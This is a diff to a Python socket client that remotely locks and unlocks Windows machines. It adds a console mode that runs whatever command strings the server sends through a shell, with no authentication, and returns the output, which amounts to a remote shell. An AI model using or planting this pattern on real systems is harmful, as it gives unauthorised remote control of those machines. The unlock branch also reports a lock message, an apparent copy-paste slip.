@@ -3,6 +3,7 @@ import json
 import wmi
 import threading
 import os
+import subprocess
 import time
 
 class ClienteSocket:
@@ -111,8 +112,16 @@ def manejar_canal_cliente():
                         cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'msg': 'Bloqueo de windows realizado exitosamente'}).encode())
                         os.system(f'{os.getcwd()}/comandos/{respuesta_servidor}.bat')
 
-                    elif respuesta_servidor == 'cmd':   
+                    elif respuesta_servidor == 'desbloquear':
+                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'msg': 'Bloqueo de windows realizado exitosamente'}).encode())
+                        os.system(f'{os.getcwd()}/comandos/{respuesta_servidor}.bat')
+
+                    elif respuesta_servidor == 'consola':
                         print('Abrir consola')
+                        current_wd = f'{os.getcwd()}>'
+                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'consola': current_wd}).encode())
+
+                        manejar_comandos_consola()
 
                     else:
                         print('Instruccion no encontrada')
@@ -150,6 +159,21 @@ def manejar_canal_cliente_secundario():
             cliente_socket.get_socket_cliente_secundario().close()
             break
 
+def manejar_comandos_consola():
+    while True:
+        comando = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
+        if comando == 'salir':
+            break
+
+        if comando[:2] == 'cd':
+            os.chdir(comando[3:])
+
+        if len(comando) > 0:
+            cmd = subprocess.Popen(comando[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = output_bytes.decode(cliente_socket.FORMAT, errors='ignore')
+            current_wd = f'{os.getcwd()}>'
+            cliente_socket.get_socket_cliente().send(str.encode(output_str + current_wd))
 
 respuesta = cliente_socket.crear_sockets()
 if respuesta['success']:
